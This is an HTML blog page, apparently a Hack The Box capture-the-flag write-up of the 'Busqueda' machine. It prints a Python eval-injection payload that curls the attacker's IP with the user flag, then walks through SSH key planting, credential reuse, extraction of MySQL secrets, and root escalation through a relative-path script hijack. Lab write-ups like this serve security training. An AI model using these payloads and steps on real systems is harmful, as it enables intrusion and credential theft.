@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Busqueda User Owning: We start off by running a simple Nmap scan on the machine and get the following:
+PORT STATE SERVICE 22/tcp open ssh 80/tcp open http We check out the site running on port 80 and are greeted with the following:
+At the bottom of the page we also see the following:
+It seems like the a package named “Searchor” is used in this application. After some googling, we find the official repository for Searchor." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://ryan-awad.github.io/htb-writeups/busqueda-writeup/" />
+
+
+    <title>
+        
+             :: Ryan Awad&#39;s Blog  — Software Developer @ Trend Micro | Aspiring Security Researcher
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.0d7cbc4f65b5154195297bbc560fa1699e59bfd4eb02e40e213d975174a8eb16.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="Busqueda User Owning: We start off by running a simple Nmap scan on the machine and get the following:
+PORT STATE SERVICE 22/tcp open ssh 80/tcp open http We check out the site running on port 80 and are greeted with the following:
+At the bottom of the page we also see the following:
+It seems like the a package named “Searchor” is used in this application. After some googling, we find the official repository for Searchor.">
+
+<meta itemprop="wordCount" content="1323">
+<meta itemprop="image" content="https://ryan-awad.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://ryan-awad.github.io/"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Busqueda User Owning: We start off by running a simple Nmap scan on the machine and get the following:
+PORT STATE SERVICE 22/tcp open ssh 80/tcp open http We check out the site running on port 80 and are greeted with the following:
+At the bottom of the page we also see the following:
+It seems like the a package named “Searchor” is used in this application. After some googling, we find the official repository for Searchor."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Busqueda User Owning: We start off by running a simple Nmap scan on the machine and get the following:
+PORT STATE SERVICE 22/tcp open ssh 80/tcp open http We check out the site running on port 80 and are greeted with the following:
+At the bottom of the page we also see the following:
+It seems like the a package named “Searchor” is used in this application. After some googling, we find the official repository for Searchor." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ryan-awad.github.io/htb-writeups/busqueda-writeup/" />
+<meta property="og:image" content="https://ryan-awad.github.io/"/>
+<meta property="og:site_name" content="Ryan Awad&#39;s Blog" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-59CYRKS995', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">tar -xf ~/ideas.tar.gz</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#b40aff;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/bug-bounties/">Bug Bounties</a></li><li><a href="/htb-writeups/">HTB Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://ryan-awad.github.io/htb-writeups/busqueda-writeup/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="busqueda">Busqueda</h1>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Busqueda.png" alt="Busqueda.png"></p>
+<h2 id="user-owning">User Owning:</h2>
+<p>We start off by running a simple Nmap scan on the machine and get the following:</p>
+<pre><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><p>We check out the site running on port 80 and are greeted with the following:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled.png" alt="Untitled"></p>
+<p>At the bottom of the page we also see the following:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%201.png" alt="Untitled"></p>
+<p>It seems like the a package named “Searchor” is used in this application. After some googling, we find the <a href="https://github.com/ArjunSharda/Searchor">official repository for Searchor</a>.</p>
+<p>After doing some digging on potential vulnerabilities on Searchor, I found the following:</p>
+<p><a href="https://github.com/ArjunSharda/Searchor/pull/130">https://github.com/ArjunSharda/Searchor/pull/130</a></p>
+<p>The version of Searchor used by this application is vulnerable to remote code execution via the <code>eval</code> function in Python.</p>
+<p>Looking at the commits in the pull request, we can see the vulnerable code:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%202.png" alt="Untitled"></p>
+<p>Assuming our inputs in the application are eventually passed through this function within the Searchor package, we can craft an input to execute arbitrary code.</p>
+<p>The following search query should make the server execute code to send an HTTP request containing the user flag, to a listening connection I will create using Netcat:</p>
+<pre><code>hello', copy_url=__import__(&quot;os&quot;).system(&quot;curl http://&lt;MY IP&gt;:5000/`cat ~/user.txt`&quot;), open_web=False) #
+</code></pre><p>And it works!</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%203.png" alt="Untitled"></p>
+<p>We now own the user!</p>
+<p>To get a nice shell in the machine, I used the vulnerability above to create a directory <code>~/.ssh</code> and a file within it called <code>authorized_keys</code> which contained my SSH public key. This allowed me to authenticate through SSH using keys.</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%204.png" alt="Untitled"></p>
+<h2 id="privilege-escalation">Privilege Escalation:</h2>
+<p>After looking around the server’s filesystem, I found some interesting things.</p>
+<p>First, looking at the <code>/etc/hosts</code> file, I found that there is a <code>gitea</code> subdomain running on the server:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%205.png" alt="Untitled"></p>
+<p>Once I navigate to the gitea subdomain, I’m greeted with a pretty standard Gitea instance.</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%206.png" alt="Untitled"></p>
+<p>After exploring the page, I find that there are only two users both with no public repositories:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%207.png" alt="Untitled"></p>
+<p>After looking through the server’s filesystem a bit more, I find the following:</p>
+<p>In <code>/var/www/app</code> which is where the Searcher app we previous saw is running, there is a <code>.git</code> directory.</p>
+<p>Inside it, we find a <code>config</code> file. Upon opening it’s contents, we find Cody’s Gitea password:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%208.png" alt="Untitled"></p>
+<p>Another interesting thing we found is inside the <code>/opt/scripts</code> directory. There are 4 scripts owned by <code>root</code> which I cannot read, write, nor execute.</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%209.png" alt="Untitled"></p>
+<p>Maybe the <code>administrator</code> user on Gitea has the scripts in a private repository.</p>
+<p>Anyways, I log into Gitea now as Cody using the username “cody” and the password we just found.</p>
+<p>I find a private repository on his account containing the code to the Searcher web app we previously exploited. Nothing really interesting here, so we move on.</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%2010.png" alt="Untitled"></p>
+<p>After trying to see if Cody’s Gitea password was reused as his sudo password, it works!</p>
+<p>After executing <code>sudo -l</code> and entering the password, we are given the following:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%2011.png" alt="Untitled"></p>
+<p>This means the only thing we can run with sudo is:</p>
+<pre><code>/usr/bin/python3 /opt/scripts/system-checkup.py &lt;ARGUMENTS&gt;
+</code></pre><p>Which so happens to be the scripts we previously mentioned.</p>
+<p>After learning how to use the script, and running the following:</p>
+<pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+</code></pre><p>We get all the docker containers running on the machine:</p>
+<pre><code>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   &quot;/usr/bin/entrypoint…&quot;   3 months ago   Up 2 hours   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              &quot;docker-entrypoint.s…&quot;   3 months ago   Up 2 hours   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</code></pre><p>We then run the following:</p>
+<pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &quot;{{json .Config}}&quot; mysql_db
+</code></pre><p>Which is the equivalent of running <code>docker inspect &quot;{{json .Config}}&quot; mysql_db</code> with the Docker CLI.</p>
+<p>We get the following output (nicely formatted):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;Hostname&#34;</span>: <span style="color:#e6db74">&#34;f84a6b33fb5a&#34;</span>,
+  <span style="color:#f92672">&#34;Domainname&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+  <span style="color:#f92672">&#34;User&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+  <span style="color:#f92672">&#34;AttachStdin&#34;</span>: <span style="color:#66d9ef">false</span>,
+  <span style="color:#f92672">&#34;AttachStdout&#34;</span>: <span style="color:#66d9ef">false</span>,
+  <span style="color:#f92672">&#34;AttachStderr&#34;</span>: <span style="color:#66d9ef">false</span>,
+  <span style="color:#f92672">&#34;ExposedPorts&#34;</span>: {
+    <span style="color:#f92672">&#34;3306/tcp&#34;</span>: {},
+    <span style="color:#f92672">&#34;33060/tcp&#34;</span>: {}
+  },
+  <span style="color:#f92672">&#34;Tty&#34;</span>: <span style="color:#66d9ef">false</span>,
+  <span style="color:#f92672">&#34;OpenStdin&#34;</span>: <span style="color:#66d9ef">false</span>,
+  <span style="color:#f92672">&#34;StdinOnce&#34;</span>: <span style="color:#66d9ef">false</span>,
+  <span style="color:#f92672">&#34;Env&#34;</span>: [
+    <span style="color:#e6db74">&#34;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&#34;</span>,
+    <span style="color:#e6db74">&#34;MYSQL_USER=gitea&#34;</span>,
+    <span style="color:#e6db74">&#34;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&#34;</span>,
+    <span style="color:#e6db74">&#34;MYSQL_DATABASE=gitea&#34;</span>,
+    <span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,
+    <span style="color:#e6db74">&#34;GOSU_VERSION=1.14&#34;</span>,
+    <span style="color:#e6db74">&#34;MYSQL_MAJOR=8.0&#34;</span>,
+    <span style="color:#e6db74">&#34;MYSQL_VERSION=8.0.31-1.el8&#34;</span>,
+    <span style="color:#e6db74">&#34;MYSQL_SHELL_VERSION=8.0.31-1.el8&#34;</span>
+  ],
+  <span style="color:#f92672">&#34;Cmd&#34;</span>: [
+    <span style="color:#e6db74">&#34;mysqld&#34;</span>
+  ],
+  <span style="color:#f92672">&#34;Image&#34;</span>: <span style="color:#e6db74">&#34;mysql:8&#34;</span>,
+  <span style="color:#f92672">&#34;Volumes&#34;</span>: {
+    <span style="color:#f92672">&#34;/var/lib/mysql&#34;</span>: {}
+  },
+  <span style="color:#f92672">&#34;WorkingDir&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+  <span style="color:#f92672">&#34;Entrypoint&#34;</span>: [
+    <span style="color:#e6db74">&#34;docker-entrypoint.sh&#34;</span>
+  ],
+  <span style="color:#f92672">&#34;OnBuild&#34;</span>: <span style="color:#66d9ef">null</span>,
+  <span style="color:#f92672">&#34;Labels&#34;</span>: {
+    <span style="color:#f92672">&#34;com.docker.compose.config-hash&#34;</span>: <span style="color:#e6db74">&#34;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&#34;</span>,
+    <span style="color:#f92672">&#34;com.docker.compose.container-number&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>,
+    <span style="color:#f92672">&#34;com.docker.compose.oneoff&#34;</span>: <span style="color:#e6db74">&#34;False&#34;</span>,
+    <span style="color:#f92672">&#34;com.docker.compose.project&#34;</span>: <span style="color:#e6db74">&#34;docker&#34;</span>,
+    <span style="color:#f92672">&#34;com.docker.compose.project.config_files&#34;</span>: <span style="color:#e6db74">&#34;docker-compose.yml&#34;</span>,
+    <span style="color:#f92672">&#34;com.docker.compose.project.working_dir&#34;</span>: <span style="color:#e6db74">&#34;/root/scripts/docker&#34;</span>,
+    <span style="color:#f92672">&#34;com.docker.compose.service&#34;</span>: <span style="color:#e6db74">&#34;db&#34;</span>,
+    <span style="color:#f92672">&#34;com.docker.compose.version&#34;</span>: <span style="color:#e6db74">&#34;1.29.2&#34;</span>
+  }
+}
+</code></pre></div><p>The 2 things that stand out are the <code>MYSQL_DATABASE</code>, and <code>MYSQL_ROOT_PASSWORD</code>. Naturally, with this information, we attempt to log into MySQL as the <code>root</code> MySQL user (not the same as the Linux <code>root</code> user):</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%2012.png" alt="Untitled"></p>
+<p>And it works!</p>
+<p>We then select the <code>gitea</code> database in MySQL, and list all the tables:</p>
+<pre><code>+---------------------------+
+| Tables_in_gitea           |
++---------------------------+
+| access                    |
+| access_token              |
+| action                    |
+| app_state                 |
+| attachment                |
+| badge                     |
+| collaboration             |
+| comment                   |
+| commit_status             |
+| commit_status_index       |
+| deleted_branch            |
+| deploy_key                |
+| email_address             |
+| email_hash                |
+| external_login_user       |
+| follow                    |
+| foreign_reference         |
+| gpg_key                   |
+| gpg_key_import            |
+| hook_task                 |
+| issue                     |
+| issue_assignees           |
+| issue_content_history     |
+| issue_dependency          |
+| issue_index               |
+| issue_label               |
+| issue_user                |
+| issue_watch               |
+| label                     |
+| language_stat             |
+| lfs_lock                  |
+| lfs_meta_object           |
+| login_source              |
+| milestone                 |
+| mirror                    |
+| notice                    |
+| notification              |
+| oauth2_application        |
+| oauth2_authorization_code |
+| oauth2_grant              |
+| org_user                  |
+| package                   |
+| package_blob              |
+| package_blob_upload       |
+| package_file              |
+| package_property          |
+| package_version           |
+| project                   |
+| project_board             |
+| project_issue             |
+| protected_branch          |
+| protected_tag             |
+| public_key                |
+| pull_auto_merge           |
+| pull_request              |
+| push_mirror               |
+| reaction                  |
+| release                   |
+| renamed_branch            |
+| repo_archiver             |
+| repo_indexer_status       |
+| repo_redirect             |
+| repo_topic                |
+| repo_transfer             |
+| repo_unit                 |
+| repository                |
+| review                    |
+| review_state              |
+| session                   |
+| star                      |
+| stopwatch                 |
+| system_setting            |
+| task                      |
+| team                      |
+| team_invite               |
+| team_repo                 |
+| team_unit                 |
+| team_user                 |
+| topic                     |
+| tracked_time              |
+| two_factor                |
+| upload                    |
+| user                      |
+| user_badge                |
+| user_open_id              |
+| user_redirect             |
+| user_setting              |
+| version                   |
+| watch                     |
+| webauthn_credential       |
+| webhook                   |
++---------------------------+
+</code></pre><p>After checking the column names of the <code>user</code> table, I notice there is an <code>is_admin</code> column. So I check its value for each user:</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%2013.png" alt="Untitled"></p>
+<p>I run the following query to set the <code>is_admin</code> value for <code>cody</code> to 1:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">UPDATE</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">SET</span> is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">WHERE</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cody&#34;</span>;
+</code></pre></div><p>This now makes Cody an admin on the Gitea instance.</p>
+<p>If we go back to the Gitea instance, we can now see <code>administrator</code>'s private repositories. Only 1 repository exists which contains the source code of the scripts we previously found in <code>/opt/scripts</code>. Jack pot!</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%2014.png" alt="Untitled"></p>
+<p>We download the scripts to inspect their source code.</p>
+<p>After looking at the <code>system-checkup.py</code> script, I notice the following lines:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;full-checkup&#39;</span>:
+    <span style="color:#66d9ef">try</span>:
+        arg_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;./full-checkup.sh&#39;</span>]
+        <span style="color:#66d9ef">print</span>(run_command(arg_list))
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[+] Done!&#39;</span>)
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)
+        exit(<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>When we run:</p>
+<pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</code></pre><p>The <code>full-checkup.sh</code> script runs (one of the 4 scripts we downloaded). We is interesting is that the script is ran using its RELATIVE PATH instead of its ABOSLUTE PATH:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">arg_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;./full-checkup.sh&#39;</span>]
+<span style="color:#66d9ef">print</span>(run_command(arg_list))
+</code></pre></div><p>A relative path is a path relative to your current directory. An absolute path is a path relative to the <code>/</code> directory. This means that the script assumes we are in the <code>/opt/scripts</code> directory in order to run the <code>full-checkup.sh</code> script in the same directory.</p>
+<p>If we navigate to another directory, and create another <code>full-checkup.sh</code> script containing any command we want, when running <code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code>, the script we made will be ran as <code>root</code>.</p>
+<p>We navigate to another directory and create a <code>full-checkup.sh</code> script containing the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>cat /root/root.txt
+</code></pre></div><p>In order to get the root flag.</p>
+<p>Made sure to run <code>chmod +x full-checkup.sh</code> to allow us to execute it as a program.</p>
+<p>We then run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</code></pre></div><p>And boom! Our script gets executed and we successfully printed the root flag!</p>
+<p><img src="Busqueda%20cd07ff4b42b444c983debcfe158d8241/Untitled%2015.png" alt="Untitled"></p>
+<h3 id="system-owned">System owned!</h3>
+<h1 id="busqueda-has-been-pwned">Busqueda has been pwned!</h1>
+<p>To get an actual root shell, just change the <code>full-checkup.sh</code> file you created to add your SSH public key to a <code>/root/.ssh/authorized_keys</code> file and simply log in as root through SSH (root SSH login is enabled on this server).</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+
+
+
+    </body>
+</html>
